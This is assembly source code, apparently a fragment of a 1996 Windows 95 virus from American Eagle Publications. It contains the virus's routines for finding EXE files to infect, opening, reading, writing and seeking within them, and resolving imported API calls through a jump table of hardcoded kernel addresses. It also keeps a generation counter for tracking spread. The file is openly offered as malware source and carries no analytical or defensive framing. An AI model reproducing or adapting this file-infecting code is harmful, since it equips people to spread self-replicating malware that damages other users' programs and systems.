;(C) 1996 American Eagle Publications, Inc.

;*******************************************************************************
;All functions that call an imported function are placed here.

;The following routines search for EXE files to infect. FIND_FIRST_FILE is
;called first, followed by repeated calls to FIND_NEXT_FILE until there are
;no more files to infect. These routines return with Z set when there are
;no more EXE files available.
FIND_FIRST_FILE:
        lea     eax,[ebp+FIND_DATA]     ;perform FindFirst function
        push    eax
        lea     eax,[edi+OFFSET ANY_FILE]
        push    eax
;        call    DWORD PTR [edi+FIND_FIRST_FILE]
        mov     ebx,FIND_FIRST
        add     ebx,[edi+JMPTBL]
        add     ebx,edi
        call    DWORD PTR [ebx]
        mov     [ebp+SRCH_HANDLE],eax
        cmp     eax,-1                  ;check for invalid handle
        ret

;This continues the search started by FIND_FIRST_FILE.
FIND_NEXT_FILE:
        lea     eax,[ebp+FIND_DATA]
        push    eax
        mov     eax,[ebp+SRCH_HANDLE]
        push    eax
;        call    DWORD PTR [edi+FIND_NEXT_FILE]
        mov     ebx,FIND_NEXT
        add     ebx,[edi+JMPTBL]
        add     ebx,edi
        call    DWORD PTR [ebx]
        or      eax,eax
        ret

;This closes the search handle used by FIND_FIRST_FILE/FIND_NEXT_FILE.
SEARCH_CLOSE:
        mov     eax,[ebp+SRCH_HANDLE]
        push    eax
;        call    DWORD PTR [edi+CLOSE_SEARCH]
        mov     ebx,FIND_CLOSE
        add     ebx,[edi+JMPTBL]
        add     ebx,edi
        call    DWORD PTR [ebx]
        or      eax,eax
        ret

ANY_FILE        DB      '*.*',0



;This routine opens a file found by FIND_FIRST_EXE.
FILE_OPEN:
        xor     eax,eax                 ;we need to push a bunch of 0 dwords
        push    eax                     ;and this is most efficient here
        push    eax                     ;FATTR_NORMAL
        push    LARGE OPEN_EXISTING
        push    eax
        push    eax
        push    LARGE GENERIC_READ or GENERIC_WRITE
        lea     eax,[ebp+FIND_DATA+44]  ;file name from search structure
        push    eax
;        call    DWORD PTR [edi+CREATE_FILE]
        mov     ebx,CREATE
        add     ebx,[edi+JMPTBL]
        add     ebx,edi
        call    DWORD PTR [ebx]
        cmp     eax,-1                  ;was file opened successfully?
        ret

;This closes the file whose handle is in FHANDLE.
FILE_CLOSE:
        push    DWORD PTR [ebp+FHANDLE] ;exit INFECT_FILE routine
;        call    DWORD PTR [edi+LCLOSE]  ;close the file
        mov     ebx,CLOSE_FILE
        add     ebx,[edi+JMPTBL]
        add     ebx,edi
        call    DWORD PTR [ebx]
        ret

;This seeks in the file with handle FHANDLE to the location eax from the
;beginning.
FILE_SEEK:
        push    LARGE 0                 ;FILE_BEGIN move method
        push    LARGE 0                 ;High DWORD of location is 0
        push    eax                     ;Low DWORD of location to move to
        push    DWORD PTR [ebp+FHANDLE] ;handle
;        call    DWORD PTR [edi+SET_FILE_PTR]
        mov     ebx,SET_FP
        add     ebx,[edi+JMPTBL]
        add     ebx,edi
        call    DWORD PTR [ebx]
        ret

;This routine writes ecx bytes to the file whose handle is in FHANDLE.
;The data is written from the buffer pointed to by edx.
FILE_WRITE:
        push    LARGE 0         ;overlapping data structure (irrelevant)
        lea     eax,[ebp+IOBYTES]
        push    eax             ;address of bytes read
        push    ecx             ;bytes to read
        push    edx             ;buffer to read data into
        push    DWORD PTR [ebp+FHANDLE]   ;file handle
;        call    DWORD PTR [edi+OFFSET WRITE_FILE]
        mov     ebx,WRITEFILE
        add     ebx,[edi+JMPTBL]
        add     ebx,edi
        call    DWORD PTR [ebx]
        or      eax,eax         ;set z if read failed
        ret

;This routine reads ecx bytes from the file whose handle is in FHANDLE.
;The data is put in the buffer pointed to by edx.
FILE_READ:
        push    LARGE 0         ;overlapping data structure (irrelevant)
        lea     eax,[ebp+IOBYTES]
        push    eax             ;address of bytes read
        push    ecx             ;bytes to read
        push    edx             ;buffer to read data into
        push    DWORD PTR [ebp+FHANDLE]   ;file handle
;        call    DWORD PTR [edi+OFFSET READ_FILE]
        mov     ebx,READFILE
        add     ebx,[edi+JMPTBL]
        add     ebx,edi
        call    DWORD PTR [ebx]
        or      eax,eax         ;set z if read failed
        ret

;This routine gets the current directory and stores it in the buffer at [eax]
;whose length is ecx.
GET_DIRECTORY:
        push    eax             ;push buffer @
        push    ecx             ;push buffer length
        mov     ebx,GET_CURR_DIR
        add     ebx,[edi+JMPTBL]
        add     ebx,edi
        call    DWORD PTR [ebx]
        or      eax,eax         ;set z if this fails
        ret

;This routine sets the current directory to that specified at [eax].
SET_DIRECTORY:
        push    eax             ;push @ of directory name
        mov     ebx,SET_CURR_DIR
        add     ebx,[edi+JMPTBL]
        add     ebx,edi
        call    DWORD PTR [ebx]
        or      eax,eax         ;set z if this fails
        ret

;This function fills in the TIME structure on the stack with the local time.
GET_LOCAL_TIME:
        lea     eax,[ebp+TIME]
        push    eax
        mov     ebx,GET_LOC_TIME
        add     ebx,[edi+JMPTBL]
        add     ebx,edi
        call    DWORD PTR [ebx]
        ret

;The message beep function is here only to illustrate importing multiple
;DLLs.
MESSAGE_BEEP:
        push    0FFFFFFFFH      ;standard speaker beep
;        call    DWORD PTR [edi+MESSAGEBEEP]
        mov     ebx,MSG_BEEP
        add     ebx,[edi+JMPTBL+4]
        add     ebx,edi
        call    DWORD PTR [ebx]
        ret

;*******************************************************************************
;The engine room. This is the lowest level of the imported function calling
;process.

;The following points to the jump table where the imported functions should
;be. For the first generation, it points to default values in the code itself,
;but in all future generations, it points to the import data area, where the
;virus imports the functions it calls. It must always be used in conjunction
;with edi to produce the proper offset of the jump table.
JMPTBL          DD      OFFSET KERNEL32_IMPORTS
                DD      OFFSET USER32_IMPORTS

;This is simply a generational counter for the virus to keep track of how
;far it might spread.
GENERATION      DD      0

                DB      'Your computer has eaten my turkish delight! - Jadis, Queen of Charn.'

IMPORT_DLLS     EQU     2               ;number of DLLs being imported
IMPORT_FCTNS    EQU     11

;The following is the size of the viral idata:
IDATA_SIZE      EQU     IMPORT_DLLS*IID_SIZE + OFFSET INAME_TABLE_END - OFFSET INAME_TABLE + 8*IMPORT_FCTNS + 8*IMPORT_DLLS

;These are the names of the imported functions required by the virus, in the
;same order as their offset declarations in the DLL_IMPORTS table
INAME_TABLE     db      'KERNEL32.dll',0        ;ASCIIZ DLL name first
                dw      11                      ;Number of functions imported by this DLL
                dw      0                       ;Hint for ordinal of following function
                db      'FindFirstFileA',0      ;ASCIIZ function names
                dw      0
                db      'FindNextFileA',0
                dw      0
                db      'CreateFileA',0
                dw      0
                db      '_lclose',0
                dw      0
                db      'SetFilePointer',0
                dw      0
                db      'ReadFile',0
                dw      0
                db      'WriteFile',0
                dw      0
                db      'GetCurrentDirectoryA',0
                dw      0
                db      'SetCurrentDirectoryA',0
                dw      0
                db      'GetLocalTime',0
                dw      0
                db      'FindClose',0
                dw      0
                db      0                       ;Indicates end of function list
                db      'USER32.dll',0          ;next DLL
                dw      1                       ;number of functions for this DLL
                dw      0
                db      'MessageBeep',0
                dw      0
                db      0                       ;end of function list
                db      0                       ;Indicates end of DLL list
INAME_TABLE_END:

;The folowing defines locate the API calls which the virus uses in 32-bit
;memory. The assigned values are just indexes into a jump table for the virus.
;That jump table is either the default table (below) which is used only in
;the first generation, or the table stored in the idata area for all following
;generations. The address of the jump table is stored at JMPTBL.
FIND_FIRST      EQU     0               ;Offsets for KERNEL32.DLL
FIND_NEXT       EQU     4
CREATE          EQU     8
CLOSE_FILE      EQU     12
SET_FP          EQU     16
READFILE        EQU     20
WRITEFILE       EQU     24
GET_CURR_DIR    EQU     28
SET_CURR_DIR    EQU     32
GET_LOC_TIME    EQU     36
FIND_CLOSE      EQU     40

MSG_BEEP        EQU     0               ;Offsets for USER32.DLL

;The following are a default jump table for the virus to call the Win 95 Kernel.
;They are only used on the first instance of the infection. After that, they are
;replaced by a vector into the imported function area itself.
DLL_IMPORTS:
KERNEL32_IMPORTS:                               ;KERNEL32.DLL
                DD      0BFF77A18H      ;@FindFirstFileA
                DD      0BFF77A50H      ;@FindNextFileA
                DD      0BFF7799CH      ;@CreateFileA
                DD      0BFF98283H      ;@_lclose
                DD      0BFF770E4H      ;@SetFilePointer
                DD      0BFF7594AH      ;@ReadFile
                DD      0BFF75951H      ;@WriteFile
                DD      0BFF77888H      ;@GetCurrentDirectoryA
                DD      0BFF77861H      ;@SetCurrentDirectoryA
                DD      0BFF7717DH      ;@GetLocalTime
                DD      0BFF76473H      ;@FindClose
USER32_IMPORTS:                                 ;USER32.DLL
                DD      0BFF623C1H      ;@MessageBeep

